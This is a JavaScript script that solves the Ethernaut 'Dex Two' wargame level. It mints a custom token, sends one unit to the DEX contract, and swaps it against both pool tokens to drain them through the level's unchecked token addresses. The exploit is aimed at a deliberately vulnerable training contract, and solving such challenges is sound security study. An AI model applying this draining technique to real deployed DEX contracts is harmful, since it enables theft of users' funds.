module.exports = async function({ artifacts, web3, ethernaut }) {
  const DexTwo = artifacts.require('DexTwo');
  const MySwappableToken = artifacts.require('MySwappableToken');
  const instanceAddress = await ethernaut.createInstance(web3, 'Dex Two');
  console.log('Created instance at', instanceAddress);

  const myToken = await MySwappableToken.new('My token', 'MTK', 10);
  await myToken.approve(instanceAddress, 10);
  await myToken.transfer(instanceAddress, 1);

  const dexInstance = await DexTwo.at(instanceAddress);
  const token1Address = await dexInstance.token1();
  const token2Address = await dexInstance.token2();

  let dexBalance1, dexBalance2;

  dexBalance1 = (await dexInstance.balanceOf(token1Address, instanceAddress)).toNumber();
  dexBalance2 = (await dexInstance.balanceOf(token2Address, instanceAddress)).toNumber();
  console.log(`Dex balance ${dexBalance1}:${dexBalance2}`);

  await dexInstance.swap(myToken.address, token1Address, 1);
  await dexInstance.swap(myToken.address, token2Address, 2);

  dexBalance1 = (await dexInstance.balanceOf(token1Address, instanceAddress)).toNumber();
  dexBalance2 = (await dexInstance.balanceOf(token2Address, instanceAddress)).toNumber();
  console.log(`Dex balance ${dexBalance1}:${dexBalance2}`);

  return ethernaut.submitInstance(web3, instanceAddress);
};